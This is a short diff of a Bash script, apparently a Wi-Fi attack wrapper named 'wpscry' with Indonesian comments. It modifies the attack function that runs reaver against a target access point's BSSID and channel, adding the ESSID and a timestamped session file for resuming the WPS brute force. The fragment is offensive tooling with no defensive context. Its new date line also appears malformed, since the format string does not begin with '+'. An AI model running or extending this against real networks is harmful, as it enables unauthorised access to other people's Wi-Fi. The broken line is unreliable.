@@ -142,7 +142,9 @@ function mengatur_target(){
 
 # fungsi untuk melakukan serangan terhadap target yang sudah diatur
 function menjalankan_serangan(){
-	reaver -i "${interface}" -c "${channel}" -b "${bssid}"
+        waktu=$(date "${essid}_+%d-%m-%Y_%H:%M:%S")
+        sesi="${waktu}.session"
+	reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}"
 }
 
 # fungsi utama wpscry
